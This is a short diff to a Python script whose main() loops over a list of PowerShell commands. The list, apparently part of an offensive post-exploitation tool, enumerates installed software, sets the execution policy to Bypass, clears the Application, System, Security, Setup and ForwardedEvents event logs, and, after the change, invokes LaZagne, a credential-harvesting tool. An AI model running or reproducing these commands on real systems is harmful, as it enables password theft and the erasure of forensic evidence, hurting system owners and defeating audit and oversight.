@@ -32,7 +32,7 @@ def main():
         '''Get-WmiObject -Class Win32_Product''',
         '''Set-ExecutionPolicy Bypass''',
         '''Clear-EventLog -LogName "Application", "System","Security","Setup","ForwardedEvents" ''',
-        '''exit'''
+        '''LaZagne'''
     ]
     output =""
     for cmnd in cmnds_to_run:
